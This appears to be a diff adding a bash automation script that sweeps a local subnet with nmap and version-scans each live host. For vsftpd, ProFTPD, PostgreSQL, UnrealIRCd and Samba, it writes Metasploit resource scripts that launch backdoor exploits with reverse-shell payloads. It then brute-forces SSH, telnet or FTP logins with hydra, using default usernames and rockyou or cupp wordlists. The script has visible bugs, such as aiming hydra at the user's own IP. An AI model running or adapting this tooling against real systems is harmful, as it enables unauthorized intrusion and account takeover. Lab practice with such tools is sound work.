@@ -1,0 +1,295 @@
+#! /bin/bash
+vsftpdFlag=0
+sshFlag=0
+telnetFlag=0
+ftpFlag=0
+sambaFlag=0
+unrealircFlag=0
+postgresqlFlag=0
+function ident_net_range(){
+	nmap -sP 192.168.72.0/24 | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' > ActiveNet.lst
+	date=$(date)
+	noIPs=$(cat ActiveNet.lst | wc -l)
+	echo "vulner script executed on $date" >> vulner.log
+	echo "script found these IPs:" >> vulner.log
+	cat ActiveNet.lst >> vulner.log
+}
+function scan_curr_lan(){
+	user_ip=$(ifconfig | grep broadcast | awk {'print $2'})
+	echo $user_ip
+	nmap -sV user_ip >> currLanScan.out
+}
+function enum_hosts(){
+	user_ip=$(ifconfig | grep broadcast | awk {'print $2'})
+	File="ActiveNet.lst"
+	Lines=$(cat $File)
+	for ip in $Lines
+	do
+	mkdir "${ip}_vulnerabilities"
+	cd "${ip}_vulnerabilities"
+	nmap -sV -sC "$ip" -oN "${ip}_vulnerabilities.txt"
+	vulnerable_each "${ip}_vulnerabilities.txt" "${ip}" "${user_ip}"
+	cd ..
+	service_login "$ip" 
+	echo "${ip}_vulnerabilities.txt created" >> vulner.log
+	add_to_log "${ip}"
+	done
+}
+function vulnerable_each(){
+	global_var_reset
+	cat "$1" | grep open | awk '{print $4,$5,$6}' >> weakpoint.lst
+	ip="$2"
+	userip="$3"
+	date=$(date)
+	File="weakpoint.lst"
+	Lines=$(cat $File)
+	for weakpoint in $Lines
+	do
+		#echo $weakpoint
+		port=$(cat $1 | grep open | grep -i $weakpoint | awk -F/ {'print $1'})
+		#echo $ip
+		#echo $port
+		#sleep 1
+		case $weakpoint in
+		*"vsftpd"* | "vsftpd 2.3.4")
+		vsftpdFlag=1
+		echo "Open port located for $weakpoint"
+		sleep 1
+		echo "writing possible vulnerability resource script for $weakpoint"
+		sleep 1
+		echo "use unix/ftp/vsftpd_234_backdoor" >> vsftpdscript.rc
+        echo "set payload/cmd/unix/interact" >> vsftpdscript.rc
+        echo "set RHOST $ip" >> vsftpdscript.rc
+        echo "exploit" >> vsftpdscript.rc
+        echo "Resource script for $weakpoint has been written inside vsftpdscript.rc"
+        sleep 1
+        echo "please launch with 'msfconsole -q -r vsftpdscript.rc' "
+        sleep 1
+		;;
+		*"SSH"*)
+		sshFlag=1
+		;;
+		*"telnet"*)
+		telnetFlag=1
+		;;
+		"ProFTPD 1.3.1" | *"ProFTPD"*)
+		ftpFlag=1
+		port=$(cat $1 | grep open | grep -i proftpd | awk -F/ {'print $1'})
+		echo "Open port located for $weakpoint"
+		sleep 1
+		echo "writing possible vulnerability resource script for $weakpoint"
+		sleep 1
+		echo "use exploit/unix/ftp/proftpd_133c_backdoor" >> proftpdscript.rc
+		echo "set RHOSTS $ip" >> proftpdscript.rc
+		echo "set RPORT $port" >> proftpdscript.rc
+		echo "set payload /cmd/unix/reverse" >> proftpdscript.rc
+		echo "set LHOST $user_ip" >> proftpdscript.rc
+		echo "set LPORT 4444" >> proftpdscript.rc
+		echo "exploit" >> proftpdscript.rc
+		echo "Resource script for $weakpoint has been written inside proftpdscript.rc"
+        sleep 1
+        echo "please launch with 'msfconsole -q -r proftpdscript.rc' "
+        sleep 1
+		;;
+		"PostgreSQL DB 8.3.0" | *"PostgreSQL"*)
+		postgresqlFlag=1
+		port=$(cat $1 | grep open | grep -i postgresql | awk -F/ {'print $1'})
+		echo "Open port located for $weakpoint"
+		sleep 1
+		echo "writing possible vulnerability resource script for $weakpoint"
+		sleep 1
+		echo "use linux/postgres/postgres_payload" >> postgresqlscript.rc
+		echo "set RHOSTS $ip" >> postgresqlscript.rc
+		echo "set LHOST $user_ip" >> postgresqlscript.rc
+		echo "exploit" >> postgresqlscript.rc
+		echo "Resource script for $weakpoint has been written inside postgresqlscript.rc"
+        sleep 1
+        echo "please launch with 'msfconsole -q -r postgresqlscript.rc' "
+        sleep 1
+		;;
+		"VNC (protocol 3.3)" | *"VNC"*)
+		;;
+		"UnrealIRCd" | *"IRC"*)
+		unrealircFlag=1
+		port=$(cat $1 | grep open | grep -i unrealircd | awk -F/ {'print $1'})
+		echo "Open port located for $weakpoint"
+		sleep 1
+		echo "writing possible vulnerability resource script for $weakpoint"
+		sleep 1
+		echo "use exploit/unix/irc/unreal_ircd_3281_backdoor" >> unrealircscript.rc
+		echo "set rhosts $ip" >> unrealircscript.rc
+		echo "set payload payload/cmd/unix/reverse" >> unrealircscript.rc
+		echo "set lhost $user_ip" >> unrealircscript.rc
+		echo "exploit" >> unrealircscript.rc
+		echo "Resource script for $weakpoint has been written inside unrealircscript.rc"
+        sleep 1
+        echo "please launch with 'msfconsole -q -r unrealircscript.rc' "
+        sleep 1
+		;; 
+		*"Samba"*)
+		sambaFlag=1
+		port=$(cat $1 | grep open | grep -i Samba | awk -F/ {'print $1'})
+		echo "Open port located for $weakpoint"
+		sleep 1
+		echo "writing possible vulnerability resource script for $weakpoint"
+		sleep 1
+		echo "use multi/samba/usermap_script" > sambascript.sc
+		echo "set rhosts $ip" >> sambascript.sc
+		echo "set payload cmd/unix/reverse_netcat" >> sambascript.sc
+		echo "set lhost $user_ip" >> sambascript.sc
+		echo "Resource script for $weakpoint has been written inside sambascript.sc"
+        sleep 1
+        echo "please launch with 'msfconsole -q -r 'sambascript.sc' "
+        sleep 1
+		esac
+	done
+}
+
+function password_brute_force() {
+	date=$(date)
+	user_ip=$(ifconfig | grep broadcast | awk {'print $2'})
+	default_user_list
+	echo "Default user name list has been created default_user_list.lst"
+	sleep 2
+	echo "Specify user list:"
+	read user_list
+	echo "Specify password list:"
+	read pass_list
+	echo $pass_list
+	if [ ! $pass_list ]
+		then 
+			echo "Password list is empty: "
+			echo "Select one of the two:"
+			echo "1. Use linux wordlists(Rockyou etc.)"
+			echo "2. Use password generator"
+			read choice
+			if [ $choice -eq 1 ]
+			then
+			  echo "Using rockyou wordlist as password list"
+			  pass_list=/usr/share/wordlists/rockyou.txt
+			else
+			  echo "Using cupp to create worlist: "
+			  sleep 1
+			  cupp -i
+			  echo "Please enter the name of the newly created wordlist"
+			  read pass_list
+			fi
+	fi
+	service="$1"
+	echo "hydra -L $user_list -P $pass_list $user_ip $service"
+	echo "Hydra brute force was executed at $date" >> vulner.log
+	hydra -L $user_list -P $pass_list $user_ip $service
+}
+
+function service_login(){
+	total=$[sshFlag+telnetFlag+ftpFlag]
+	if [ $total -gt 1 ]
+	  then
+		echo "more than 1 port is open to use Hydra password brute force, defaulting to SSH"
+		  sleep 2
+		  echo "Attempting brute force now"
+		  sleep 2
+		  password_brute_force "ssh" 
+		  echo "Vulnerability located in $1 and Hydra password brute force performed at $date for SSH service">> vulner.log
+	  else
+		if [ $sshFlag -eq 1 ]
+		then
+		echo "hello"
+			echo "SSH Port is open "
+			echo "Attempting brute force now"
+		    sleep 2
+			password_brute_force "ssh" 
+			echo "Vulnerability located in $1 and Hydra password brute force performed at $date for SSH service">> vulner.log
+		fi
+		if [ $telnetFlag -eq 1 ]
+		then
+			echo "telnet Port is open "
+			echo "Attempting brute force now"
+		    sleep 2
+			password_brute_force "telnet" 
+			echo "Vulnerability located in $1 and Hydra password brute force performed at $date for telnet service">> vulner.log
+		fi
+		if [ $ftpFlag -eq 1 ]
+		then
+			echo "ftp Port is open "
+			echo "Attempting brute force now"
+		    sleep 2
+		    
+			password_brute_force "ftp" 
+			echo "Vulnerability located in $1 and Hydra password brute force performed at $date for FTP service">> vulner.log
+		fi
+	  fi
+	
+}
+function global_var_reset(){
+vsftpdFlag=0
+sshFlag=0
+telnetFlag=0
+ftpFlag=0
+sambaFlag=0
+unrealircFlag=0
+postgresqlFlag=0
+}
+function show_global(){
+echo $vsftpdFlag
+echo $sshFlag
+echo $telnetFlag
+echo $ftpFlag
+echo $sambaFlag
+echo $unrealircFlag
+echo $postgresqlFlag
+}
+function add_to_log(){
+	if [ $vsftpdFlag -eq 1 ]
+	then
+		echo "Vulnerability located in $1 Resource script for vsftpd has been written inside vsftpdscript.rc at $date">> vulner.log
+	fi
+	if [ $sshFlag -eq 1 ]
+	then
+		echo "Vulnerability located in $1 at $date for SSH service">> vulner.log
+	fi
+	if [ $telnetFlag -eq 1 ]
+	then
+		echo "Vulnerability located in $1 at $date for telnet service">> vulner.log
+	fi
+	if [ $ftpFlag -eq 1 ]
+	then
+		echo "Vulnerability located in $1 $date for FTP service">> vulner.log
+	fi
+	if [ $sambaFlag -eq 1 ]
+	then
+		echo "Vulnerability located in $1 Resource script for Samba has been written inside sambascript.sc at $date">> vulner.log
+	fi
+	if [ $unrealircFlag -eq 1 ]
+	then
+		echo "Vulnerability located in $1 Resource script for unrealirc has been written inside unrealircscript.rc at $date">> vulner.log
+	fi
+	if [ $postgresqlFlag -eq 1 ]
+	then
+		echo "Vulnerability located in $1 Resource script for unrealirc has been written inside postgresqlscript.rc at $date">> vulner.log
+	fi
+}
+
+function default_user_list(){
+	echo "admin" >> default_user_list.lst
+	echo "administrator" >> default_user_list.lst
+	echo "user" >> default_user_list.lst
+	echo "root" >> default_user_list.lst
+	echo "test" >> default_user_list.lst
+	echo "ubuntu" >> default_user_list.lst
+	echo "guest" >> default_user_list.lst
+	echo "support" >> default_user_list.lst
+	echo "oracle" >> default_user_list.lst
+	echo "pi" >> default_user_list.lst
+	echo "postgres" >> default_user_list.lst
+	echo "ftpuser" >> default_user_list.lst
+}
+function log_check(){
+	echo "list the ip you want to check for vulnerabilities in the log:"
+	cat ActiveNet.lst
+	read choice
+	cat vulner.log | grep $choice
+}
+ident_net_range
+enum_hosts
+log_check
